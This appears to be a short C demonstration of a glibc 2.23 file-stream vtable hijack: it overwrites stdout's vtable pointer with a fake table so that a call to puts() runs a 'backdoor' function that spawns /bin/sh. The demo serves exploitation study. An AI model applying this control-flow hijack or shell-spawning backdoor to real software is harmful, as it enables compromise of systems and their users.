#include <stdio.h>

// Testing with libc-2.23
// gcc fake_vtable.c -o fake_vtable

void backdoor(void)
{
    system("/bin/sh");
}

int main(void)
{
    char *p;
    void **vtable;
    void *fake_vtable[20];

    p = stdout;
    vtable = (void *)&p[0xd8];

    *vtable = fake_vtable;

    fake_vtable[7] = backdoor;

    puts("Demo");
}
